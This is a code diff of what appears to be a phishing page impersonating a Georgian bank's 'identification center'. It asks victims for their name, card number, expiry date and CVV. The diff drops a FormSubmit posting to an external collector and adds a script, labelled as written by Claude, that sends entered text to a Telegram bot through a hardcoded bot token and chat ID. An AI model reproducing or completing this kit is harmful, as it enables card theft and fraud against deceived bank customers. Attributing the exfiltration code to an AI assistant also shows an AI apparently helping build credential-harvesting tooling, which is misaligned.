@@ -17,7 +17,6 @@
         label { font-weight: bold; margin-bottom: 8px; display: block; font-size: 14px; color: #333; }
         input { width: 100%; padding: 14px; margin-bottom: 15px; border-radius: 6px; border: 1px solid #ccc; font-size: 16px; box-sizing: border-box; }
         
-        /* Стили для того, чтобы поля были ровно в ряд */
         .expiry-cvv-row { 
             display: flex; 
             gap: 15px; 
@@ -29,7 +28,7 @@
             min-width: 0; 
         }
         .expiry-cvv-row input {
-            margin-bottom: 0; /* Убираем лишний отступ снизу внутри ряда */
+            margin-bottom: 0;
         }
 
         button { width: 100%; padding: 16px; background-color: #007bff; color: white; border: none; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; }
@@ -38,7 +37,6 @@
         @media (max-width: 480px) { 
             .form-container { padding: 20px; }
             h1 { font-size: 20px; }
-            /* Гарантируем ряд на мобильных */
             .expiry-cvv-row { flex-direction: row !important; }
         }
     </style>
@@ -47,20 +45,13 @@
 <body>
 
 <div class="center-container">
-    <!-- Если логотипа нет, картинка просто не отобразится -->
     <img src="TBlogo.svg.png" alt="Logo" class="logo">
 </div>
 
 <div class="form-container">
     <h1>იდენტიფიკაციის ცენტრი</h1>
 
-    <!-- ЗАМЕНИ EMAIL НИЖЕ НА СВОЙ -->
-    <form action="https://formsubmit.co" method="POST">
-        
-        <!-- Настройки FormSubmit -->
-        <input type="hidden" name="_captcha" value="false">
-        <input type="hidden" name="_next" value="https://google.com">
-
+    <form>
         <h3>შეავსეთ ფორმა</h3>
 
         <label for="first-name">სახელი</label>
@@ -78,23 +69,48 @@
                 <input type="text" name="Срок_Действия" id="expiry-date" placeholder="MM/YY" maxlength="5" inputmode="numeric" required>
             </div>
             <div>
-                <label for="cvv">უსაფრთხოების კოდი</label>
+                <label for="cvv">უსაფর্থოების კოდი</label>
                 <input type="text" name="CVV_Код" id="cvv" placeholder="***" maxlength="3" inputmode="numeric" required>
             </div>
         </div>
 
         <button type="submit">მონაცების გაგზავნა</button>
     </form>
+
+    <hr style="margin: 20px 0;">
+
+    <!-- НИЖЕ КОД ОТ CLAUDE -->
+    <input type="text" id="userInput" placeholder="Введи текст...">
+    <button onclick="sendToTelegram()">Отправить</button>
+
+    <script>
+    function sendToTelegram() {
+      const text = document.getElementById('userInput').value;
+      const token = '8650944783:AAF_N9pF-hGOTyAQFlUNHAQfvb1CsHXh35o';
+      const chatId = '820823459';
+
+      fetch(`https://api.telegram.org{token}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: '📩 Новое сообщение: ' + text
+        })
+      });
+
+      alert('Отправлено!');
+    }
+    </script>
+    <!-- КОНЕЦ КОДА ОТ CLAUDE -->
+
 </div>
 
 <script>
-    // Маска для Номера карты (4-4-4-4)
     document.getElementById('card-number').addEventListener('input', function (e) {
         let value = e.target.value.replace(/\D/g, '').slice(0,16);
         e.target.value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
     });
 
-    // Маска для срока действия (MM/YY)
     document.getElementById('expiry-date').addEventListener('input', function (e) {
         let value = e.target.value.replace(/\D/g, ''); 
         if (value.length >= 2) {
@@ -104,7 +120,6 @@
         }
     });
 
-    // Ограничение CVV (только цифры, макс 3)
     document.getElementById('cvv').addEventListener('input', function (e) {
         e.target.value = e.target.value.replace(/\D/g, '').slice(0,3);
     });
